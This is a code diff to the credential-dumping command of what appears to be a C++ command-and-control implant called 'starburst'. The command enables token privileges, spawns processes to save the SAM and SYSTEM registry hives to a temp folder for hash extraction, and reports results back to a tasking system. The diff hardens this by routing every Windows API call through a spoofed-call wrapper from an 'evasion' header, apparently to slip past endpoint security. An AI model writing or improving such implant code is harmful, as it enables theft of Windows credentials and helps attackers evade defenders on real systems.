@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_HASHDUMP
 
@@ -19,7 +20,7 @@ static auto declfn enable_privilege(
     const wchar_t* priv_name
 ) -> bool {
     HANDLE h_token = nullptr;
-    if ( !inst.advapi32.OpenProcessToken(
+    if ( !SCALL( inst, advapi32.OpenProcessToken,
             reinterpret_cast<HANDLE>( static_cast<LONG_PTR>( -1 ) ),
             TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &h_token ) )
         return false;
@@ -27,11 +28,11 @@ static auto declfn enable_privilege(
     TOKEN_PRIVILEGES tp = {};
     tp.PrivilegeCount = 1;
     tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-    inst.advapi32.LookupPrivilegeValueW( nullptr, priv_name, &tp.Privileges[0].Luid );
-    inst.advapi32.AdjustTokenPrivileges( h_token, FALSE, &tp, sizeof(tp), nullptr, nullptr );
+    SCALL( inst, advapi32.LookupPrivilegeValueW, nullptr, priv_name, &tp.Privileges[0].Luid );
+    SCALL( inst, advapi32.AdjustTokenPrivileges, h_token, FALSE, &tp, sizeof(tp), nullptr, nullptr );
 
-    DWORD err = inst.kernel32.GetLastError();
-    inst.kernel32.CloseHandle( h_token );
+    DWORD err = (DWORD)SCALL( inst, kernel32.GetLastError );
+    SCALL( inst, kernel32.CloseHandle, h_token );
     return ( err == 0 );
 }
 
@@ -42,7 +43,7 @@ static auto declfn exec_and_wait(
     DWORD timeout_ms
 ) -> bool {
     wchar_t wcmdline[512] = { 0 };
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, cmdline_a, -1, wcmdline, 512 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, cmdline_a, -1, wcmdline, 512 );
 
     STARTUPINFOW si = {};
     si.cb          = sizeof( STARTUPINFOW );
@@ -51,7 +52,7 @@ static auto declfn exec_and_wait(
 
     PROCESS_INFORMATION pi = {};
 
-    BOOL ok = inst.kernel32.CreateProcessW(
+    BOOL ok = (BOOL)SCALL( inst, kernel32.CreateProcessW,
         nullptr, wcmdline,
         nullptr, nullptr,
         FALSE,
@@ -63,7 +64,7 @@ static auto declfn exec_and_wait(
     if ( !ok )
         return false;
 
-    inst.kernel32.WaitForSingleObject( pi.hProcess, timeout_ms );
+    SCALL( inst, kernel32.WaitForSingleObject, pi.hProcess, timeout_ms );
 
     DWORD exit_code = 1;
     // GetExitCodeProcess is available via GetProcAddress
@@ -73,10 +74,10 @@ static auto declfn exec_and_wait(
             reinterpret_cast<uintptr_t>( (HMODULE)inst.kernel32.handle ),
             expr::hash_string( "GetExitCodeProcess" ) ) );
     if ( pGetExitCodeProcess )
-        pGetExitCodeProcess( pi.hProcess, &exit_code );
+        SCALL_PTR( inst, pGetExitCodeProcess, pi.hProcess, &exit_code );
 
-    inst.kernel32.CloseHandle( pi.hThread );
-    inst.kernel32.CloseHandle( pi.hProcess );
+    SCALL( inst, kernel32.CloseHandle, pi.hThread );
+    SCALL( inst, kernel32.CloseHandle, pi.hProcess );
     return ( exit_code == 0 );
 }
 
@@ -106,7 +107,7 @@ auto declfn starburst::cmd_hashdump(
 
     // get temp directory
     char temp_dir[260] = { 0 };
-    DWORD temp_len = pGetTempPathA( 260, temp_dir );
+    DWORD temp_len = (DWORD)SCALL_PTR( inst, pGetTempPathA, 260, temp_dir );
     if ( temp_len == 0 || temp_len > 240 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetTempPathA failed" ) ) );
@@ -146,7 +147,7 @@ auto declfn starburst::cmd_hashdump(
     bool sam_ok = exec_and_wait( inst, cmd_sam, 15000 );
     if ( !sam_ok ) {
         // cleanup on failure
-        if ( pDeleteFileA ) pDeleteFileA( sam_path );
+        if ( pDeleteFileA ) SCALL_PTR( inst, pDeleteFileA, sam_path );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "reg save HKLM\\SAM failed" ) ) );
         return;
@@ -157,8 +158,8 @@ auto declfn starburst::cmd_hashdump(
     if ( !sys_ok ) {
         // cleanup on failure
         if ( pDeleteFileA ) {
-            pDeleteFileA( sam_path );
-            pDeleteFileA( sys_path );
+            SCALL_PTR( inst, pDeleteFileA, sam_path );
+            SCALL_PTR( inst, pDeleteFileA, sys_path );
         }
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "reg save HKLM\\SYSTEM failed" ) ) );
